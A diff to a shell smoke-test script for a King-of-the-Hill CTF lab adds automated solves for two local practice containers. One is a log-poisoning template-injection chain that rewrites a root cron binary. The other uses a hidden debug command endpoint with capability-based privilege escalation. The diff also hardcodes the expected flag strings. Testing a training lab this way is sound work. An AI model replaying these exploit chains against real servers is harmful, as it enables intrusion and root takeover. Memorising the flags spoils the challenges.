@@ -141,6 +141,30 @@ h18_root(){ B=$(printf 'goblin ALL=(root) NOPASSWD: ALL\n' | base64 | tr -d '\n'
 h18_king(){ h18_yaml "echo $TOKEN | sudo tee /root/king.txt" >/dev/null;
             h18_yaml 'sudo cat /root/king.txt' | grep -o 'TOK-[A-Za-z0-9-]*'; }
 
+# hill-12 (repair-gated LFI + log poisoning -> RCE -> PATH-hijack root cron). Repair-first.
+h12_repair(){ curl -s -X POST http://127.0.0.1:8092/rescue --data-urlencode 'cfg=set boot=on' >/dev/null; }
+h12_user(){ h12_repair; curl -s -G http://127.0.0.1:8092/view --data-urlencode 'page=/home/kevin/user.txt' | grep -o 'CTF{[^}]*}'; }
+h12_root(){ h12_repair
+  UA='{{(__import__("pathlib").Path("/opt/arcade/bin/keeper").write_text("#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n"), __import__("os").chmod("/opt/arcade/bin/keeper",0o755))}}'
+  curl -s -A "$UA" -G http://127.0.0.1:8092/view --data-urlencode 'page=/etc/hostname' >/dev/null
+  curl -s -G http://127.0.0.1:8092/render --data-urlencode 'page=/var/log/arcade/access.log' >/dev/null; sleep 5
+  curl -s -G http://127.0.0.1:8092/view --data-urlencode 'page=/tmp/r' | grep -o 'CTF{[^}]*}'; }
+h12_king(){ h12_repair
+  UA='{{(__import__("pathlib").Path("/opt/arcade/bin/keeper").write_text("#!/bin/sh\necho '"$TOKEN"' > /root/king.txt; cat /root/king.txt > /tmp/k; chmod 666 /tmp/k\n"), __import__("os").chmod("/opt/arcade/bin/keeper",0o755))}}'
+  curl -s -A "$UA" -G http://127.0.0.1:8092/view --data-urlencode 'page=/etc/hostname' >/dev/null
+  curl -s -G http://127.0.0.1:8092/render --data-urlencode 'page=/var/log/arcade/access.log' >/dev/null; sleep 5
+  curl -s -G http://127.0.0.1:8092/view --data-urlencode 'page=/tmp/k' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+
+# hill-20 (repair-gated hidden debug RCE -> cap_dac_override). Repair-first.
+h20_repair(){ curl -s -X POST http://127.0.0.1:8100/repair --data-urlencode 'runbook=set emergency=off' >/dev/null; }
+h20_run(){ h20_repair; curl -s -G http://127.0.0.1:8100/marauders --data-urlencode 'iSolemnlySwear=I am up to no good' --data-urlencode "cmd=$1"; }
+h20_user(){ h20_run 'cat /home/room/user.txt' | grep -o 'CTF{[^}]*}'; }
+h20_root(){ h20_run 'roompy -c "print(open(\"/root/root.txt\").read())"' | grep -o 'CTF{[^}]*}'; }
+h20_king(){ h20_run "roompy -c \"open('/root/king.txt','w').write('$TOKEN')\"" >/dev/null;
+            h20_run 'roompy -c "print(open(\"/root/king.txt\").read())"' | grep -o 'TOK-[A-Za-z0-9-]*'; }
+# hill-15 (Eywa) is intentionally excluded: its privesc is a host escape via the docker socket,
+# which must never run on a shared host, so it is not part of the automated smoke.
+
 uf(){ case "$1" in
   1) echo 'CTF{w3b_rc3_1gn1t10n_f00th0ld}';; 2) echo 'CTF{drup4lg3dd0n2_unauth_rce}';;
   3) echo 'CTF{r3d1s_un4uth_module_load}';;   4) echo 'CTF{j3nk1ns_gr00vy_scr1pt_c0ns0l3}';;
@@ -150,7 +174,8 @@ uf(){ case "$1" in
   10) echo 'CTF{p1ckl3_r3duc3_0n_th3_gr1d}';; 14) echo 'CTF{sql1_0r_1_3q_1_p4nd0r4}';;
   17) echo 'CTF{sst1_sp3ll_h0gw4rts_rc3}';;   19) echo 'CTF{ssrf_lf1_0wl_p0st_l34k}';;
   11) echo 'CTF{unauth_d3bug_l1ght_cycl3}';; 13) echo 'CTF{cmd_1nj_rd4_s3ns0r_d14g}';;
-  16) echo 'CTF{r3p41r_3v4l_unobt41n1um}';;  18) echo 'CTF{y4ml_uns4f3_l04d_g0bl1ns}';;  esac; }
+  16) echo 'CTF{r3p41r_3v4l_unobt41n1um}';;  18) echo 'CTF{y4ml_uns4f3_l04d_g0bl1ns}';;
+  12) echo 'CTF{lf1_l0g_p01s0n_flynns_4rc4d3}';; 20) echo 'CTF{h1dd3n_m4r4ud3rs_m4p_rc3}';;  esac; }
 rf(){ case "$1" in
   1) echo 'CTF{l4r4v3l_sud0_gtf0b1ns_r00t}';; 2) echo 'CTF{su1d_b1t_pr1v3sc_on_h0st}';;
   3) echo 'CTF{wr1t4bl3_cr0n_j0b_2_r00t}';;   4) echo 'CTF{h0st_pr1v3sc_sud0_r00t_w1n}';;
@@ -160,9 +185,10 @@ rf(){ case "$1" in
   10) echo 'CTF{su1d_f1nd_d3r3z_t0_r00t}';;  14) echo 'CTF{sud0_p3rl_syst3m_2_r00t}';;
   17) echo 'CTF{sud0_pyth0n_expell14rmus}';; 19) echo 'CTF{r00t_cr0n_wr1t4bl3_m1n1stry}';;
   11) echo 'CTF{wr1t4bl3_un1t_3x3cst4rt_r00t}';; 13) echo 'CTF{sud0_dd_r34d_wr1t3_r00t}';;
-  16) echo 'CTF{sud0_3nv_r00t_r3f1n3ry}';;    18) echo 'CTF{r00t_1nst4lls_sud03rs_gr1ng0tts}';; esac; }
+  16) echo 'CTF{sud0_3nv_r00t_r3f1n3ry}';;    18) echo 'CTF{r00t_1nst4lls_sud03rs_gr1ng0tts}';;
+  12) echo 'CTF{p4th_h1j4ck_4rc4d3_r00t}';;   20) echo 'CTF{c4p_d4c_0v3rr1d3_r00m}';; esac; }
 
-for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 11 13 14 16 17 18 19}; do   # set HILLS to test a subset, e.g. HILLS="5 6 7 8 9"
+for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 11 12 13 14 16 17 18 19 20}; do   # set HILLS to test a subset, e.g. HILLS="5 6 7 8 9"
   echo "=== hill-$n ==="
   ok "$(h${n}_user)" "$(uf $n)" "hill-$n user flag (foothold)"
   ok "$(h${n}_root)" "$(rf $n)" "hill-$n root flag (privesc)"
@@ -188,9 +214,11 @@ break_privesc(){ case "$1" in
   13) docker exec koth-hill-13 rm -f /etc/sudoers.d/ops 2>/dev/null;;
   16) docker exec koth-hill-16 rm -f /etc/sudoers.d/refiner 2>/dev/null;;
   18) docker exec koth-hill-18 sh -c 'rm -f /etc/sudoers.d/pwn* /opt/vault/grants/*.sudo; chown root:root /opt/vault/grants; chmod 755 /opt/vault/grants' 2>/dev/null;;
+  12) docker exec koth-hill-12 sh -c 'rm -f /opt/arcade/bin/keeper /tmp/r; chown root:root /opt/arcade/bin; chmod 755 /opt/arcade/bin' 2>/dev/null;;
+  20) docker exec koth-hill-20 setcap -r /usr/local/bin/roompy 2>/dev/null;;
   *) return 1;;                                                                  # hill-3 (writable cron): no cheap block/reset check
 esac; }
-for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 11 13 14 16 17 18 19}; do
+for n in ${HILLS:-1 2 3 4 5 6 7 8 9 10 11 12 13 14 16 17 18 19 20}; do
   break_privesc "$n" || continue
   docker exec koth-hill-$n /opt/app/reset.sh >/dev/null 2>&1
   ok "$(h${n}_root)" "$(rf $n)" "hill-$n privesc works after reset"
